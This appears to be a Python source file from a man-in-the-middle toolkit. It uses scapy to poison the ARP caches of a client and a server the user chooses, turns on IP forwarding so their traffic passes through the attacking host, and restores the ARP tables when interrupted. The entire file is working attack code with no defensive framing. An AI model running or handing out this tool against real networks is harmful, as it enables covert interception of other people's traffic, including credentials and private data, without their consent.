from pip._vendor.distlib.compat import raw_input
from scapy.all import *

from src.mitm.utils import get_mac


def undo_arp(ip1, ip2):
    print("\n[*] Restoring Targets...")
    target1_mac = get_mac(ip1)
    target2_mac = get_mac(ip2)
    send(ARP(op=2, pdst=ip2, psrc=ip1, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=target1_mac), count=7)
    send(ARP(op=2, pdst=ip1, psrc=ip2, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=target2_mac), count=7)
    print("[*] Disabling IP Forwarding...")
    os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
    print("[*] Shutting Down...")
    sys.exit(1)


def poison_arp(target1_mac, ip1, target2_mac, ip2):
    send(ARP(op=2, pdst=ip1, psrc=ip2, hwdst=target1_mac))
    send(ARP(op=2, pdst=ip2, psrc=ip1, hwdst=target2_mac))


def mitm():
    try:
        target1_ip = raw_input("[*] Enter Client IP: ")
        target2_ip = raw_input("[*] Enter Server IP: ")
    except KeyboardInterrupt:
        print("\n[*] User Requested Shutdown")
        print("[*] Exiting...")
        sys.exit(1)

    print("\n[*] Enabling IP Forwarding...\n")
    os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
    try:
        target1_mac = get_mac(target1_ip)
    except Exception:
        os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
        print("[!] Couldn't Find Client MAC Address")
        print("[!] Exiting...")
        sys.exit(1)
    try:
        target2_mac = get_mac(target2_ip)
    except Exception:
        os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
        print("[!] Couldn't Find Server MAC Address")
        print("[!] Exiting...")
        sys.exit(1)
    print("[*] Poisoning Targets...")
    while 1:
        try:
            poison_arp(target1_mac, target1_ip, target2_mac, target2_ip)
            time.sleep(1.5)
        except KeyboardInterrupt:
            undo_arp(target1_ip, target2_ip)
            break
